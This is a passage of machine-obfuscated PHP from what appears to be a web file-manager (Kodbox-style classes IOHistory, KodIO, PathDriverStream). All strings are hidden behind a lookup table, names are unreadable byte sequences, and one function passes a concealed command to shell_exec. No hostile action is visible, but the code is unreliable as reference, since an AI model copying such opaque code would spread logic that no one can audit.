($€’›êÕ‹[$ëä¬Á•’[454]] == $¯ä¤ Üê) { $Û…©à«Û[$ëä¬Á•’[424]][$¸Á‘ ­Ğ][$ëä¬Á•’[1283]] = $Ÿë÷ìÜÆ; self::saveData($Û…©à«Û[$ëä¬Á•’[1285]], $Û…©à«Û[$ëä¬Á•’[424]]); return !0; } } return !1; } public static function fileInfo($Ğ‡£¼³, $œıÏ‚˜) { $±ïŸîÎŒ =& $_SERVER[•€áå–Õ]; $†ºà¾‚ = self::listData($Ğ‡£¼³); if (!$†ºà¾‚) { show_json(LNG($±ïŸîÎŒ[117]), !1); } $âÇ•ššÑ = $±ïŸîÎŒ[22]; foreach ($†ºà¾‚[$±ïŸîÎŒ[424]] as $¬×¥Ô—Ö => $¨ÛÙ½•Ä) { if ($¨ÛÙ½•Ä[$±ïŸîÎŒ[454]] != $œıÏ‚˜) { continue; } $âÇ•ššÑ = $†ºà¾‚[$±ïŸîÎŒ[1284]] . $¨ÛÙ½•Ä[$±ïŸîÎŒ[42]]; break; } if (!$âÇ•ššÑ) { show_json(LNG($±ïŸîÎŒ[117]), !1); } return IO::info($âÇ•ššÑ); } public static function fileOut($ó©²şû‚, $ñšìÄ‰â, $êª›áÆï = false) { $…ÅïÉ› =& $_SERVER[•€áå–Õ]; $’ñ„ü«´ = self::fileInfo($ó©²şû‚, $ñšìÄ‰â); $åÌÈã¹› =& $GLOBALS[$…ÅïÉ›[17]]; $êª›áÆï = isset($åÌÈã¹›[$…ÅïÉ›[1235]]) && $åÌÈã¹›[$…ÅïÉ›[1235]] == 1; if (isset($åÌÈã¹›[$…ÅïÉ›[43]]) && $åÌÈã¹›[$…ÅïÉ›[43]] == $…ÅïÉ›[1286]) { return IO::fileOutImage($’ñ„ü«´[$…ÅïÉ›[96]], $åÌÈã¹›[$…ÅïÉ›[1287]]); } IO::fileOut($’ñ„ü«´[$…ÅïÉ›[96]], $êª›áÆï, get_path_this($ó©²şû‚)); } public static function listData($®ÜÛ×ê†, $…Ôø¥Æâ = true) { $­ÛœÍˆ¬ =& $_SERVER[•€áå–Õ]; if ($…Ôø¥Æâ && !IO::exist($®ÜÛ×ê†)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($®ÜÛ×ê†, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ú‘Í¢÷à = self::pathHistory($®ÜÛ×ê†); $¶´®š˜± = array($­ÛœÍˆ¬[1285] => $Ú‘Í¢÷à . $­ÛœÍˆ¬[1272], $­ÛœÍˆ¬[1284] => rtrim(get_path_father($Ú‘Í¢÷à), $­ÛœÍˆ¬[18]) . $­ÛœÍˆ¬[18], $­ÛœÍˆ¬[424] => array()); $Ä„Ó´³• = IO::getContent($¶´®š˜±[$­ÛœÍˆ¬[1285]]); if ($Ä„Ó´³•) { $Óö´ŒÓœ = json_decode($Ä„Ó´³•, !0); if (is_array($Óö´ŒÓœ)) { $¶´®š˜±[$­ÛœÍˆ¬[424]] = $Óö´ŒÓœ; } } return $¶´®š˜±; } private static function saveData($ƒ·“˜Ó , $õµ¦‹˜¹) { $¶µßüî =& $_SERVER[•€áå–Õ]; self::log($¶µßüî[1288] . $ƒ·“˜Ó  . $¶µßüî[83] . count($õµ¦‹˜¹), $¶µßüî[792]); if ($õµ¦‹˜¹) { return IO::setContent($ƒ·“˜Ó , json_encode($õµ¦‹˜¹)); } $‰Ñ¼Šİ = IO::pathFather($ƒ·“˜Ó ); IO::remove($ƒ·“˜Ó ); self::clearEmptyFolder($‰Ñ¼Šİ); return !0; } public static function clearEmptyFolder($Ù¡Å‘ßĞ) { $‚­ÅÆòñ =& $_SERVER[•€áå–Õ]; if (trim($Ù¡Å‘ßĞ, $‚­ÅÆòñ[18]) == trim(self::$_historyBase, $‚­ÅÆòñ[18])) { return; } $†–÷Ÿ©Ğ = IO::pathFather($Ù¡Å‘ßĞ); $•Ì¦­£Ì = IO::has($Ù¡Å‘ßĞ, !0); if ($•Ì¦­£Ì[$‚­ÅÆòñ[235]] > 0 || $•Ì¦­£Ì[$‚­ÅÆòñ[236]] > 0) { return; } IO::remove($Ù¡Å‘ßĞ); self::clearEmptyFolder($†–÷Ÿ©Ğ); } private static function getBasePath() { $ÑÖß°™ =& $_SERVER[•€áå–Õ]; $¸¼úí¬å = Model($ÑÖß°™[1289])->get($ÑÖß°™[1290]); if ($¸¼úí¬å) { if (!IO::exist($¸¼úí¬å)) { IO::mkdir($¸¼úí¬å); } if (get_path_this($¸¼úí¬å) == $ÑÖß°™[1275]) { $‹§è = $ÑÖß°™[1291] . rand_string(8); @rename($¸¼úí¬å, get_path_father($¸¼úí¬å) . $ÑÖß°™[18] . $‹§è); $¸¼úí¬å = DATA_PATH . $‹§è . $ÑÖß°™[18]; file_put_contents(DATA_PATH . $ÑÖß°™[1225], $ÑÖß°™[22]); Model($ÑÖß°™[1289])->set($ÑÖß°™[1290], $¸¼úí¬å); } return $¸¼úí¬å; } $¸¼úí¬å = DATA_PATH . $ÑÖß°™[1291] . rand_string(8) . $ÑÖß°™[18]; $¸¼úí¬å = IO::mkdir($¸¼úí¬å); $¸¼úí¬å = rtrim($¸¼úí¬å, $ÑÖß°™[18]) . $ÑÖß°™[18]; file_put_contents($¸¼úí¬å . $ÑÖß°™[1225], $ÑÖß°™[22]); file_put_contents(DATA_PATH . $ÑÖß°™[1225], $ÑÖß°™[22]); Model($ÑÖß°™[1289])->set($ÑÖß°™[1290], $¸¼úí¬å); return $¸¼úí¬å; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\163\145\x72\122\x65\x63\171\x63\154\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\145\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\x65\x72\x46\x69\154\145\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\106\151\154\145\x54\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\x52\157\x6f\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\162\x53\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\x72\x53\150\x61\x72\145\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\145\124\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\x72\145\111\x74\145\155\x4c\151\156\153\x7d"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\143\153\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\x65\x6e\143\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\x65\162\175"; public static function typeList() { $Á¼ÊÉŠ™ =& $_SERVER[•€áå–Õ]; return array($Á¼ÊÉŠ™[1292] => self::KOD_SOURCE, $Á¼ÊÉŠ™[1293] => self::KOD_USER_RECYCLE, $Á¼ÊÉŠ™[1294] => self::KOD_USER_FAV, $Á¼ÊÉŠ™[1295] => self::KOD_USER_FILE_TAG, $Á¼ÊÉŠ™[1296] => self::KOD_USER_FILE_TYPE, $Á¼ÊÉŠ™[1297] => self::KOD_GROUP_ROOT_SELF, $Á¼ÊÉŠ™[1298] => self::KOD_USER_SHARE, $Á¼ÊÉŠ™[1299] => self::KOD_USER_SHARE_LINK, $Á¼ÊÉŠ™[1300] => self::KOD_USER_SHARE_TO_ME, $Á¼ÊÉŠ™[1301] => self::KOD_SHARE_ITEM, $Á¼ÊÉŠ™[1302] => self::KOD_SHARE_LINK, $Á¼ÊÉŠ™[1303] => self::KOD_SEARCH, $Á¼ÊÉŠ™[1304] => self::KOD_BLOCK, $Á¼ÊÉŠ™[1305] => self::KOD_IO, $Á¼ÊÉŠ™[1306] => self::KOD_USER_RECENT, $Á¼ÊÉŠ™[1307] => self::KOD_USER_DRIVER); } public static function parse($õÜÅ¾Ş¬) { $¹¶ªáêÎ =& $_SERVER[•€áå–Õ]; $õÜÅ¾Ş¬ = self::clear($õÜÅ¾Ş¬); $ Ş‚ˆ’“ = array_values(self::typeList()); preg_match($¹¶ªáêÎ[1308], $õÜÅ¾Ş¬, $ä”’Ó×); $Ûª­¹­¥ = array($¹¶ªáêÎ[475] => !1, $¹¶ªáêÎ[1309] => !1, $¹¶ªáêÎ[472] => !1, $¹¶ªáêÎ[96] => $õÜÅ¾Ş¬, $¹¶ªáêÎ[1210] => !1, $¹¶ªáêÎ[1209] => $¹¶ªáêÎ[22]); if (is_array($ä”’Ó×) && count($ä”’Ó×) == 5) { $Ä­²àµè = $¹¶ªáêÎ[1310] . $ä”’Ó×[2] . $¹¶ªáêÎ[382]; if (in_array($Ä­²àµè, $ Ş‚ˆ’“)) { $Ûª­¹­¥[$¹¶ªáêÎ[1210]] = $ä”’Ó×[1]; $Ûª­¹­¥[$¹¶ªáêÎ[43]] = $Ä­²àµè; $Ûª­¹­¥[$¹¶ªáêÎ[1311]] = substr($Ä­²àµè, 1, -1); $Ûª­¹­¥[$¹¶ªáêÎ[454]] = $ä”’Ó×[3]; } $Ûª­¹­¥[$¹¶ªáêÎ[1209]] = $ä”’Ó×[4]; } $ŠØÜ³™Ì = array($¹¶ªáêÎ[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ûª­¹­¥[$¹¶ªáêÎ[1274]] = in_array($Ûª­¹­¥[$¹¶ªáêÎ[43]], $ŠØÜ³™Ì); return $Ûª­¹­¥; } public static function isTruePath($ÏÔÈîÑÓ) { $£ÙÈÌµÛ =& $_SERVER[•€áå–Õ]; if (substr($ÏÔÈîÑÓ, 0, 1) != $£ÙÈÌµÛ[1310]) { return !0; } if (strpos($ÏÔÈîÑÓ, $£ÙÈÌµÛ[462]) === 0) { return !0; } if (strpos($ÏÔÈîÑÓ, $£ÙÈÌµÛ[1278]) === 0) { return !0; } if (strpos($ÏÔÈîÑÓ, $£ÙÈÌµÛ[1312]) === 0) { return !0; } if (strpos($ÏÔÈîÑÓ, $£ÙÈÌµÛ[1313]) === 0) { return !0; } if (strpos($ÏÔÈîÑÓ, $£ÙÈÌµÛ[1314]) === 0) { return !0; } return !1; } public static function clear($¨ìæ‰ë) { $ËÍİµÜ€ =& $_SERVER[•€áå–Õ]; $¨ìæ‰ë = str_replace(array($ËÍİµÜ€[1119], $ËÍİµÜ€[12]), $ËÍİµÜ€[63], $¨ìæ‰ë); $¨ìæ‰ë = str_replace($ËÍİµÜ€[109], $ËÍİµÜ€[18], $¨ìæ‰ë); $±ìïÏ§œ = $ËÍİµÜ€[1315]; if (substr($¨ìæ‰ë, 0, 3) == $ËÍİµÜ€[1316]) { $¨ìæ‰ë = substr($¨ìæ‰ë, 3); } while (strstr($¨ìæ‰ë, $±ìïÏ§œ)) { $¨ìæ‰ë = str_replace($±ìïÏ§œ, $ËÍİµÜ€[18], $¨ìæ‰ë); } $¨ìæ‰ë = preg_replace($ËÍİµÜ€[1317], $ËÍİµÜ€[18], $¨ìæ‰ë); if ($¨ìæ‰ë == $ËÍİµÜ€[18]) { return $ËÍİµÜ€[18]; } $¨ìæ‰ë = rtrim($¨ìæ‰ë, $ËÍİµÜ€[18]); return $¨ìæ‰ë; } public static function pathTrue($ÖÆÈë·Ë) { $İÅÏ©ôÀ =& $_SERVER[•€áå–Õ]; if (!$ÖÆÈë·Ë) { return $İÅÏ©ôÀ[22]; } $ÖÆÈë·Ë = str_replace($İÅÏ©ôÀ[572], $İÅÏ©ôÀ[18], str_replace($İÅÏ©ôÀ[1318], $İÅÏ©ôÀ[18], $ÖÆÈë·Ë)); $ÖÆÈë·Ë = str_replace($İÅÏ©ôÀ[572], $İÅÏ©ôÀ[18], str_replace($İÅÏ©ôÀ[1318], $İÅÏ©ôÀ[18], $ÖÆÈë·Ë)); if (!strstr($ÖÆÈë·Ë, $İÅÏ©ôÀ[1316])) { return $ÖÆÈë·Ë; } $ĞÕ’ß¥ï = explode($İÅÏ©ôÀ[18], $ÖÆÈë·Ë); foreach ($ĞÕ’ß¥ï as $Ó­îÁ«Ÿ => $ÖæİÉù) { if ($ÖæİÉù !== $İÅÏ©ôÀ[1319]) { continue; } for ($ÃÎÊÃ³˜ = $Ó­îÁ«Ÿ; $ÃÎÊÃ³˜ >= 0; $ÃÎÊÃ³˜--) { if ($ĞÕ’ß¥ï[$ÃÎÊÃ³˜] === $İÅÏ©ôÀ[20] || $ĞÕ’ß¥ï[$ÃÎÊÃ³˜] === $İÅÏ©ôÀ[1319] || $ĞÕ’ß¥ï[$ÃÎÊÃ³˜] === -1) { continue; } if ($ĞÕ’ß¥ï[$ÃÎÊÃ³˜] === $İÅÏ©ôÀ[22]) { $ĞÕ’ß¥ï[$Ó­îÁ«Ÿ] = -1; break; } $ĞÕ’ß¥ï[$Ó­îÁ«Ÿ] = -1; $ĞÕ’ß¥ï[$ÃÎÊÃ³˜] = -1; break; } } $å­ÃàÀõ = array(); foreach ($ĞÕ’ß¥ï as $ÖæİÉù) { if ($ÖæİÉù !== -1) { $å­ÃàÀõ[] = $ÖæİÉù; } } $úú¦­‰³ = implode($İÅÏ©ôÀ[18], $å­ÃàÀõ); if (strpos($úú¦­‰³, $İÅÏ©ôÀ[1320]) === 0) { $úú¦­‰³ = $İÅÏ©ôÀ[1316] . substr($úú¦­‰³, strlen($İÅÏ©ôÀ[1320])); } return $úú¦­‰³; } public static function sourceID($Ê‘õó×İ) { $ã¿³¦–œ =& $_SERVER[•€áå–Õ]; $’øŒÃ½» = self::parse($Ê‘õó×İ); if ($’øŒÃ½»[$ã¿³¦–œ[43]] !== self::KOD_SOURCE) { show_json(LNG($ã¿³¦–œ[1321]), !1); } return $’øŒÃ½»[$ã¿³¦–œ[454]]; } public static function make($õ¸ÁÌİÒ) { if (!$õ¸ÁÌİÒ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($õ¸ÁÌİÒ)); } public static function makeShare($ÁüÑÜÊ·, $ÓÌëÑÚş) { return self::makePath(self::KOD_SHARE_ITEM, $ÁüÑÜÊ·, $ÓÌëÑÚş); } public static function makeFileTypePath($‰˜ÀŞÁÔ) { return self::makePath(self::KOD_USER_FILE_TYPE, $‰˜ÀŞÁÔ); } public static function makeFileTagPath($Î·ƒüûˆ) { return self::makePath(self::KOD_USER_FILE_TAG, $Î·ƒüûˆ); } public static function makePath($íìÛ¨ˆé, $í²†Œóô = '', $ãà’÷÷‚ = '') { $ÁÄ¨¢‡« =& $_SERVER[•€áå–Õ]; $Àöİ¼õ = substr($íìÛ¨ˆé, 1, -1); $ı¼ÂÃÙû = $ÁÄ¨¢‡«[1322] . $Àöİ¼õ . $ÁÄ¨¢‡«[1323] . $í²†Œóô . $ÁÄ¨¢‡«[1324]; $ı¼ÂÃÙû = $ãà’÷÷‚ ? $ı¼ÂÃÙû . $ãà’÷÷‚ . $ÁÄ¨¢‡«[18] : $ı¼ÂÃÙû; return $ı¼ÂÃÙû; } public static function hashPath($Õ•è½Ù¡, $‹›ÂµŒù = true) { $©›¢×¥î =& $_SERVER[•€áå–Õ]; $Ø¢Ûğğ‚ = is_array($Õ•è½Ù¡) ? $Õ•è½Ù¡ : IO::info($Õ•è½Ù¡); $µûÇï…Ş = _get($Ø¢Ûğğ‚, $©›¢×¥î[1325], $©›¢×¥î[22]); if (!$µûÇï…Ş && isset($Ø¢Ûğğ‚[$©›¢×¥î[231]])) { $µûÇï…Ş = trim($Ø¢Ûğğ‚[$©›¢×¥î[231]], $©›¢×¥î[130]); } if (!$µûÇï…Ş && isset($Ø¢Ûğğ‚[$©›¢×¥î[193]]) && $Ø¢Ûğğ‚[$©›¢×¥î[193]]) { $Ø¢Ûğğ‚ = IO::info(KodIO::make($Ø¢Ûğğ‚[$©›¢×¥î[193]])); $µûÇï…Ş = _get($Ø¢Ûğğ‚, $©›¢×¥î[1325], $©›¢×¥î[22]); } $šø £¨È = md5($Ø¢Ûğğ‚[$©›¢×¥î[96]] . $Ø¢Ûğğ‚[$©›¢×¥î[88]] . $Ø¢Ûğğ‚[$©›¢×¥î[97]]); if (!$µûÇï…Ş && file_exists($Ø¢Ûğğ‚[$©›¢×¥î[96]])) { $µûÇï…Ş = Cache::get($šø £¨È . $©›¢×¥î[1326]); $µûÇï…Ş = !1; if (!$µûÇï…Ş) { $µûÇï…Ş = IO::hashSimple($Ø¢Ûğğ‚[$©›¢×¥î[96]]); Cache::set($šø £¨È . $©›¢×¥î[1326], $µûÇï…Ş, 3600 * 24 * 30); } } if ($‹›ÂµŒù && !$µûÇï…Ş) { } return $µûÇï…Ş ? $µûÇï…Ş : $šø £¨È; } public static function hashPathSafe($èùñå–, $—Éà´Ñ = true) { $øÕø¥– =& $_SERVER[•€áå–Õ]; $’Â›­‹â = self::hashPath($èùñå–, $—Éà´Ñ); return md5($’Â›­‹â . $øÕø¥–[1327] . Model($øÕø¥–[811])->get($øÕø¥–[812])); } public static function initSystemPath() { $“ºÕî‚´ =& $_SERVER[•€áå–Õ]; if (defined($“ºÕî‚´[1328])) { return; } define($“ºÕî‚´[1328], self::systemPath($“ºÕî‚´[191])); define($“ºÕî‚´[1329], self::systemPath($“ºÕî‚´[1330])); define($“ºÕî‚´[1331], self::systemPath($“ºÕî‚´[1332])); define($“ºÕî‚´[1333], self::systemPath($“ºÕî‚´[1334])); IOHistory::bindEvent(); } public static function systemPath($ãØ­ĞÑµ) { $¿Ú‹¹Ë¬ =& $_SERVER[•€áå–Õ]; $ï“€²ò = $¿Ú‹¹Ë¬[1335] . ucfirst($ãØ­ĞÑµ); $Ç›öÊÄ“ = Model($¿Ú‹¹Ë¬[811])->get($ï“€²ò); if ($Ç›öÊÄ“) { return $Ç›öÊÄ“; } if ($ãØ­ĞÑµ == $¿Ú‹¹Ë¬[191]) { $Ç›öÊÄ“ = self::make(Model($¿Ú‹¹Ë¬[866])->systemRootPathAdd($¿Ú‹¹Ë¬[585])); } else { $Ç›öÊÄ“ = self::systemPath($¿Ú‹¹Ë¬[191]); $ÒøÖÌ¡¶ = self::sourceID($Ç›öÊÄ“); $Ç›öÊÄ“ = self::make(Model($¿Ú‹¹Ë¬[866])->mkdir($ÒøÖÌ¡¶, $ãØ­ĞÑµ)); } Model($¿Ú‹¹Ë¬[811])->set($ï“€²ò, $Ç›öÊÄ“); return $Ç›öÊÄ“; } public static function systemFolder($èå×ãÊÄ) { $öò…µ®Ô = IO_PATH_SYSTEM_SOURCE . $èå×ãÊÄ; $ š„£­¨ = Cache::get($öò…µ®Ô); if (!$ š„£­¨) { $ì·Ç—¡ƒ = IO::infoFullSimple($öò…µ®Ô); if (!$ì·Ç—¡ƒ) { $ š„£­¨ = IO::mkdir($öò…µ®Ô, REPEAT_SKIP); } else { $ š„£­¨ = $ì·Ç—¡ƒ[$_SERVER[•€áå–Õ][96]]; } Cache::set($öò…µ®Ô, $ š„£­¨, 3600 * 10); } return $ š„£­¨; } public static function defaultDriver() { return Model($_SERVER[•€áå–Õ][808])->defaultDriver(); } public static function defaultIO() { $áù×‚ù‘ =& $_SERVER[•€áå–Õ]; $²¶ö¤ªı = self::defaultDriver(); return $áù×‚ù‘[1336] . $²¶ö¤ªı[$áù×‚ù‘[454]] . $áù×‚ù‘[1324]; } public static function defaultDriverInit() { static $ÑòüĞµ = false; if ($ÑòüĞµ) { return $ÑòüĞµ; } $ÑòüĞµ = IO::init(self::defaultIO()); return $ÑòüĞµ; } public static function fileTypeList() { $şô³»êÜ =& $_SERVER[•€áå–Õ]; $¢‘ı¤İÅ = $GLOBALS[$şô³»êÜ[16]][$şô³»êÜ[1337]]; foreach ($¢‘ı¤İÅ as $â†¢áğ² => $¿ƒìšÑÓ) { $ôØˆ¡’æ = $şô³»êÜ[1338] . $â†¢áğ²; $ œ•òéÄ = LNG($ôØˆ¡’æ); if ($ôØˆ¡’æ != $ œ•òéÄ) { $¢‘ı¤İÅ[$â†¢áğ²][$şô³»êÜ[42]] = $ œ•òéÄ; } } return $¢‘ı¤İÅ; } public static function diskList($¿¤ëÎË = true) { $…ÜŒ›òì = $_SERVER[•€áå–Õ][1339]; if ($¿¤ëÎË) { $è‘Èœ†” = Cache::get($…ÜŒ›òì); if (is_array($è‘Èœ†”)) { return $è‘Èœ†”; } } $è‘Èœ†” = self::diskListGet(); Cache::set($…ÜŒ›òì, $è‘Èœ†”, 60); return $è‘Èœ†”; } public static function diskListGet() { $¦ßı«£ =& $_SERVER[•€áå–Õ]; $²Í®Íî· = array(); if ($GLOBALS[$¦ßı«£[16]][$¦ßı«£[1340]] == $¦ßı«£[1341]) { $¬îÆÓÉ = $¦ßı«£[1342]; for ($Ô˜õµ‘— = 0; $Ô˜õµ‘— < strlen($¬îÆÓÉ); $Ô˜õµ‘—++) { $°íª¨§Ë = $¬îÆÓÉ[$Ô˜õµ‘—] . $¦ßı«£[1343]; if (file_exists($°íª¨§Ë)) { $²Í®Íî·[] = $°íª¨§Ë; } } return $²Í®Íî·; } if (!function_exists($¦ßı«£[110])) { $²Í®Íî·[] = $¦ßı«£[877]; return $²Í®Íî·; } $Ê¤•º¤ = explode($¦ßı«£[12], shell_exec($¦ßı«£[1344])); array_shift($Ê¤•º¤); array_pop($Ê¤•º¤); $«Ï¾¸î– = array($¦ßı«£[1345], $¦ßı«£[1346], $¦ßı«£[1347], $¦ßı«£[1348], $¦ßı«£[1349], $¦ßı«£[1350], $¦ßı«£[1351], $¦ßı«£[1352]); foreach ($Ê¤•º¤ as $õİÁ–†) { $ñş–´âÛ = preg_split($¦ßı«£[1353], $õİÁ–†); $°íª¨§Ë = $ñş–´âÛ[count($ñş–´âÛ) - 1]; if (!strstr($ñş–´âÛ[0], $¦ßı«£[1354]) || !$°íª¨§Ë) { continue; } $£¦Ü€´ = rtrim($°íª¨§Ë, $¦ßı«£[18]) . $¦ßı«£[18]; if (in_array($£¦Ü€´, $«Ï¾¸î–)) { continue; } $²Í®Íî·[] = $£¦Ü€´; } return $²Í®Íî·; } public static function isSameDisk($ŠÇ±¨×Ì, $èÜìÉ‚ç) { $úºØØ =& $_SERVER[•€áå–Õ]; if ($GLOBALS[$úºØØ[16]][$úºØØ[1340]] == $úºØØ[1341]) { return strtolower(substr($ŠÇ±¨×Ì, 0, 1)) == strtolower(substr($èÜìÉ‚ç, 0, 1)); } $Ô•Ô³Á° = self::diskList(); $·íÑğÖÓ = !1; $¦ÖŠº†Ú = !1; sort($Ô•Ô³Á°); $Ô•Ô³Á° = array_reverse($Ô•Ô³Á°); $ŠÇ±¨×Ì = rtrim($ŠÇ±¨×Ì, $úºØØ[18]) . $úºØØ[18]; $èÜìÉ‚ç = rtrim($èÜìÉ‚ç, $úºØØ[18]) . $úºØØ[18]; foreach ($Ô•Ô³Á° as $ŸßŸ§åÁ) { $ÇÈœÕ¦Ğ = strlen($ŸßŸ§åÁ); if (!$·íÑğÖÓ && substr($ŠÇ±¨×Ì, 0, $ÇÈœÕ¦Ğ) == $ŸßŸ§åÁ) { $·íÑğÖÓ = $ŸßŸ§åÁ; } if (!$¦ÖŠº†Ú && substr($èÜìÉ‚ç, 0, $ÇÈœÕ¦Ğ) == $ŸßŸ§åÁ) { $¦ÖŠº†Ú = $ŸßŸ§åÁ; } if ($·íÑğÖÓ && $¦ÖŠº†Ú) { break; } } return $·íÑğÖÓ === $¦ÖŠº†Ú; } public static function transferType($’¡ß½£±, $›öğ´›Ÿ) { $â¹ãÏå† =& $_SERVER[•€áå–Õ]; $ô¾Áå¼ = self::driverType($’¡ß½£±); $ÄÈè¼« = self::driverType($›öğ´›Ÿ); if ($ô¾Áå¼[$â¹ãÏå†[43]] == $ÄÈè¼«[$â¹ãÏå†[43]] && $ô¾Áå¼[$â¹ãÏå†[1355]] == $ÄÈè¼«[$â¹ãÏå†[1355]]) { return $â¹ãÏå†[1356]; } if ($ô¾Áå¼[$â¹ãÏå†[43]] == $â¹ãÏå†[910] && $ÄÈè¼«[$â¹ãÏå†[43]] == $â¹ãÏå†[118]) { return $â¹ãÏå†[1235]; } if ($ô¾Áå¼[$â¹ãÏå†[43]] == $â¹ãÏå†[118] && $ÄÈè¼«[$â¹ãÏå†[43]] == $â¹ãÏå†[910]) { return $â¹ãÏå†[119]; } return $â¹ãÏå†[1357]; } public static function driverType($µ“ÙŠ‹Á) { $—½Ï¼Œ =& $_SERVER[•€áå–Õ]; $šÒää¬ø = str_replace($—½Ï¼Œ[1358], $—½Ï¼Œ[22], strtolower($µ“ÙŠ‹Á->getType())); if ($šÒää¬ø == $—½Ï¼Œ[798] || $šÒää¬ø == $—½Ï¼Œ[1359] || $šÒää¬ø == $—½Ï¼Œ[1360]) { $µ“ÙŠ‹Á = self::defaultDriverInit(); } else { if ($šÒää¬ø == $—½Ï¼Œ[1245] || $šÒää¬ø == $—½Ï¼Œ[1361]) { $µ“ÙŠ‹Á = IO::init($µ“ÙŠ‹Á->pathParse[$—½Ï¼Œ[1192]]); } } $ÏÈ÷¢½ = $µ“ÙŠ‹Á->path; $šÒää¬ø = str_replace($—½Ï¼Œ[1358], $—½Ï¼Œ[22], strtolower($µ“ÙŠ‹Á->getType())); if ($šÒää¬ø == $—½Ï¼Œ[118]) { return array($—½Ï¼Œ[43] => $—½Ï¼Œ[118], $—½Ï¼Œ[1355] => $—½Ï¼Œ[22], $—½Ï¼Œ[96] => $ÏÈ÷¢½, $—½Ï¼Œ[107] => $µ“ÙŠ‹Á); } return array($—½Ï¼Œ[43] => $—½Ï¼Œ[910], $—½Ï¼Œ[1355] => $µ“ÙŠ‹Á->pathDriver, $—½Ï¼Œ[96] => $ÏÈ÷¢½, $—½Ï¼Œ[107] => $µ“ÙŠ‹Á); } public static function pathDriverType($¬Š–„…) { return $¬Š–„… ? self::driverType(IO::init($¬Š–„…)) : !1; } public static function pathDriverLocal($—Îó‹—) { $Í²Óà— =& $_SERVER[•€áå–Õ]; $˜é±ˆ°è = $—Îó‹— ? self::driverType(IO::init($—Îó‹—)) : !1; return $˜é±ˆ°è[$Í²Óà—[43]] == $Í²Óà—[118] ? !0 : !1; } public static function allowCover($ËÆ£Ç¾‡, $Î¥½ = true) { $±”Œ¾óŠ =& $_SERVER[•€áå–Õ]; if (is_string($ËÆ£Ç¾‡)) { $ËÆ£Ç¾‡ = IO::info($ËÆ£Ç¾‡); } if (!$ËÆ£Ç¾‡ || $ËÆ£Ç¾‡[$±”Œ¾óŠ[43]] == $±”Œ¾óŠ[87] || $ËÆ£Ç¾‡[$±”Œ¾óŠ[88]] <= 100) { return !1; } if (isset($ËÆ£Ç¾‡[$±”Œ¾óŠ[1362]]) || !$ËÆ£Ç¾‡[$±”Œ¾óŠ[96]]) { return !1; } if (isset($ËÆ£Ç¾‡[$±”Œ¾óŠ[228]]) && !$ËÆ£Ç¾‡[$±”Œ¾óŠ[228]]) { return !1; } static $¾óñÖş = false; if (!$¾óñÖş || !$Î¥½) { $¶£ÁÏÃ = self::driverType(IO::init($ËÆ£Ç¾‡[$±”Œ¾óŠ[96]])); $ÒªÂÈ† = $¶£ÁÏÃ[$±”Œ¾óŠ[107]]; $¾óñÖş = $±”Œ¾óŠ[196]; if ($¶£ÁÏÃ[$±”Œ¾óŠ[43]] == $±”Œ¾óŠ[118]) { $¾óñÖş = $±”Œ¾óŠ[1363]; } if ($¶£ÁÏÃ[$±”Œ¾óŠ[107]] && is_array($¶£ÁÏÃ[$±”Œ¾óŠ[107]]->config)) { $ğğèê­¨ = $¶£ÁÏÃ[$±”Œ¾óŠ[107]]->config; if (isset($ğğèê­¨[$±”Œ¾óŠ[1364]]) && $ğğèê­¨[$±”Œ¾óŠ[1364]]) { $¾óñÖş = $±”Œ¾óŠ[1363]; } } } return $¾óñÖş == $±”Œ¾óŠ[1363] ? !0 : !1; } } goto C¼’Òö°¦¶; D“ÑêÆ§ÉÈ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Æ¿ÎÂ–ì, $Ÿ£²ÁÓì = 0) { parent::__construct(); $this->source = $Æ¿ÎÂ–ì; $this->sourceSize = $Ÿ£²ÁÓì; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ë€¸æÙ = false) { return $this->sourceSize; } public function getContent($‘«Ü¶–¨ = false) { return $this->fileSubstr($‘«Ü¶–¨, 0, $this->sourceSize); } public function fileSubstr($—“¼Å¦¾ = false, $äçú›ë’ = 0, $öâ†šòğ = 0) { if (!$öâ†šòğ) { $öâ†šòğ = $this->sourceSize; } $ûğŠÆî = $this->sourceSize - $äçú›ë’; if ($öâ†šòğ >= $ûğŠÆî) { $öâ†šòğ = $ûğŠÆî; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $äçú›ë’, $öâ†šòğ); } if ($this->sourceType == self::TYPE_FILE) { if ($öâ†šòğ <= 0) { return $_SERVER[•€áå–Õ][22]; } $Æ¿¡«Î = ftell($this->source); fseek_64($this->source, $Æ¿¡«Î + $äçú›ë’); $ú´…áå = @fread($this->source, $öâ†šòğ); fseek_64($this->source, $Æ¿¡«Î); return $ú´…áå; } } public function hashMd5($“œŠŒß¥ = false) { return md5($this->getContent()); } public static function hash($ø£„ÅŠ…, $ªà¢¹ô = 0) { $•æ‚¤Û = new PathDriverStream($ø£„ÅŠ…, $ªà¢¹ô); return $•æ‚¤Û->hashSimple($ø£„ÅŠ…); } public static function 